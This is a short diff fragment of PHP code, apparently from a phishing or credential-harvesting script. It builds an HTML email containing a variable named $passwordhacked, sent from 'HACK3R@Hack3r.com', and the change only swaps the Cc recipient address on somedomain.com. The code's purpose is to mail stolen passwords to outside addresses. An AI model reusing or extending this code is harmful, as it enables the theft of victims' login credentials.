@@ -8,7 +8,7 @@
          $message .= "<br>$passwordhacked";
          
          $header = "From:HACK3R@Hack3r.com \r\n";
-         $header .= "Cc:afgh@somedomain.com \r\n";
+         $header .= "Cc:abcd@somedomain.com \r\n";
          $header .= "MIME-Version: 1.0\r\n";
          $header .= "Content-type: text/html\r\n";
          
